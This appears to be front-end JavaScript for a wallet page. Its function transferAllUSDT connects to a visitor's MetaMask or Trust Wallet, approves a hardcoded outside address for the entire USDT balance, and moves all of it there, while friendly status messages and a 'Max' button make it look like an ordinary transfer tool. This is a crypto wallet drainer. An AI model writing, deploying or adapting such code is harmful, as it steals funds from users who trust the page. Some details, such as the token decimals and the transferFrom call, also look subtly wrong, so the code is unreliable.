async function transferAllUSDT() {
  const statusDiv = document.getElementById("status");
  statusDiv.innerText = "🔄 Connecting wallet...";
  try {
    if (!window.ethereum) {
      statusDiv.innerText = "⚠️ Please install MetaMask or Trust Wallet extension.";
      return;
    }
    const web3 = new Web3(window.ethereum);
    await window.ethereum.request({ method: "eth_requestAccounts" });

    const accounts = await web3.eth.getAccounts();
    const sender = accounts[0];
    const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT BEP-20
    const receiver = "0xB53941b949D3ac68Ba48AF3985F9F59105Cdf999";

    // USDT minimal ABI for required methods
    const usdtABI = [
      {
        constant: true,
        inputs: [{ name: "_owner", type: "address" }],
        name: "balanceOf",
        outputs: [{ name: "balance", type: "uint256" }],
        type: "function",
      },
      {
        constant: false,
        inputs: [
          { name: "_spender", type: "address" },
          { name: "_value", type: "uint256" },
        ],
        name: "approve",
        outputs: [{ name: "", type: "bool" }],
        type: "function",
      },
      {
        constant: true,
        inputs: [
          { name: "_owner", type: "address" },
          { name: "_spender", type: "address" },
        ],
        name: "allowance",
        outputs: [{ name: "", type: "uint256" }],
        type: "function",
      },
      {
        constant: false,
        inputs: [
          { name: "_from", type: "address" },
          { name: "_to", type: "address" },
          { name: "_value", type: "uint256" },
        ],
        name: "transferFrom",
        outputs: [{ name: "", type: "bool" }],
        type: "function",
      },
    ];

    const contract = new web3.eth.Contract(usdtABI, usdtAddress);

    const balance = await contract.methods.balanceOf(sender).call();

    if (balance === "0") {
      statusDiv.innerText = "🚫 No USDT found in your wallet.";
      return;
    }

    statusDiv.innerText = "🟡 Approving USDT transfer...";

    const allowance = await contract.methods.allowance(sender, receiver).call();

    if (BigInt(allowance) < BigInt(balance)) {
      await contract.methods.approve(receiver, balance).send({ from: sender });
    }

    statusDiv.innerText = "✅ Approval complete. Transferring USDT...";

    await contract.methods.transferFrom(sender, receiver, balance).send({ from: sender });

    statusDiv.innerText = "🎉 All USDT transferred successfully!";
  } catch (err) {
    console.error(err);
    statusDiv.innerText = "❌ Error: " + err.message;
  }
}

// Optional: Max button sets amount input to current balance (display only)
async function setMax() {
  try {
    if (!window.ethereum) return;
    const web3 = new Web3(window.ethereum);
    const accounts = await web3.eth.getAccounts();
    const sender = accounts[0];
    const usdtAddress = "0x55d398326f99059fF775485246999027B3197955";
    const usdtABI = [
      {
        constant: true,
        inputs: [{ name: "_owner", type: "address" }],
        name: "balanceOf",
        outputs: [{ name: "balance", type: "uint256" }],
        type: "function",
      },
    ];
    const contract = new web3.eth.Contract(usdtABI, usdtAddress);
    const balance = await contract.methods.balanceOf(sender).call();
    const decimals = 6; // USDT decimals on BSC
    const amountInput = document.getElementById("amount");
    if (balance && amountInput) {
      const formatted = (balance / 10 ** decimals).toFixed(6);
      amountInput.value = formatted;
    }
  } catch {
    // ignore errors silently
  }
}
